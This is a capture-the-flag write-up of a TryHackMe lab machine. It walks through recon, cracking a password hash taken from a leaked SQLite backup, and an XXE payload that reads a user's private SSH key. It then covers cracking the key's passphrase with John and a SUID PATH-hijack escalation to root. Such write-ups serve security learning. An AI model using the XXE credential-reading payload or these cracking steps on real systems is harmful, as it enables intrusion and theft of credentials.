# Mustacchio V2
Easy boot2boot machine

## Recon
### Nmap Scan
At the commencement of each CTF challenge, our initial step consistently involves conducting an nmap scan.

```
sudo nmap -sC -sV -O -T4 10.10.41.60 -vv -p- -oG all
```

![Nmap Scan](/THM/images/nmap.PNG)

As evident from our findings, two ports, specifically port 80 and port 8765, are open and host a website.

### Gobuster Scan
Since there is a website that is being hosted, we will then run 
```
gobuster dir -t 100 --url http://10.10.41.60 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
``` 
as part of our scan to find any hidden directories.

While waiting for the gobuster scan to finish scanning the directories, i went to the website to find for any hints to continue with the challenge.

![Website](/THM/images/website.PNG)

However i did not find anything that is useful to continue the challenge.

Once the Gobuster scan had completed, I returned to the terminal to review the results.

![Gobuster Scan](/THM/images/gobuster.PNG)

This is where i traversed around the directory that was discovered by the Gobuster and found something interesting in the custom/js folder.

![custom/js folder](/THM/images/custom.PNG)

I found the file called **"users.bak"** which immediately alarmed me that it could be an backup file that contains database information.

After downloading the file, this is where i ran 
```
file users.bak
```

![users.bak strings](/THM/images/usersbak.PNG)

which confirms my doubt that it was a sqlite backup file.

After that i ran **"sqlitebrowser"** and drop the file inside the newly opened tab.

![SQLite](/THM/images/SQLite.PNG)

This is where i found a username and password in hash format, so i used crackstation.net to crack the password.

![user](/THM/images/user.PNG)

![crack](/THM/images/crack.PNG)

### Port 8765
From the original website that is hosted at port 80, i couldn't use the login details that i have found from the previous recon so i decided to go to port 8765.

![login](/THM/images/login.PNG)

Ohhh shit, from here i found a login page and decided to give the username and password that i have gathered during the previous recon.

![successful login](/THM/images/successful.PNG)

It worked!

I then chose to spend some time exploring the website, during which I came across the following information.

![view source](/THM/images/source.PNG)

At this juncture, I opted to download the file (/auth/dontforget.bak) from the website and inspect its contents, where I subsequently uncovered...

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>   
```

I made the decision to experiment with the form both by submitting it without any input and by using the input I had identified in the file.

![empty](/THM/images/emptyinput.PNG)

![xml](/THM/images/xmlinput.PNG)

At this point, I initiated a Google search to investigate XML vulnerabilities, which led me to discover a vulnerability known as XML External Entity (XXE) Processing.

## Exploitation
Recalling what we had discovered while examining the homepage
```
Barry, you can now SSH in using your key!
```

I decided to give the payload a try
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>  
```

![xxe](/THM/images/xxe.PNG)

It worked!

I proceeded to copy the RSA key using the command <mark style="background-color:grey">echo [rsa_key] > barry_id_rsa</mark>. It was apparent that the key was encrypted. To decipher the password, I employed the following command
```
ssh2john barry_id_rsa > for_john
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn
```

![john cracked](/THM/images/cracked.PNG)

Subsequently, I utilized the "id_rsa" file along with the cracked passphrase to establish an SSH connection to the target machine.

![ssh](/THM/images/ssh.PNG)

## Privilege Escaltion
### Potential methods for privilege escalation
I initiated a series of commands to assess the system for potential vulnerabilities.
```
"id" to check if the user was part of the LXC/LXD group.
"uname -a" to examine the kernel version and assess the system for potential kernel exploits
```

### SUID for privilege escalation
When I executed the command
```
find / -perm -u=s -type f 2>/dev/null
```

I came across an intriguing file that had the capability to run as a privileged user
![suid](/THM/images/suid.PNG)

I navigated to that directory and tried to find out what the file does.

At this point, I discovered that one of the commands within the program was not utilizing an absolute path.

![attack](/THM/images/attack.PNG)

This reminded me of the technique mentioned in the https://tryhackme.com/room/linuxprivesc, where a similar method was discussed for privilege escalation.

### Creating payload

![payload](/THM/images/payload.PNG)

Setting path for payload to execute

![path](/THM/images/path.PNG)

Execute the payload

![execute](/THM/images/root.PNG)

Viola, now you are root.

## Conclusion
This room provided me with an opportunity to apply the knowledge and skills I had been honing over the past two months, particularly in the areas of web exploitation, basic reverse engineering(strings), basic privilege escalation. With being able to pick up knowledge and skills on XML external entity (XXE) injection. Thank to zyeinn for creating the room.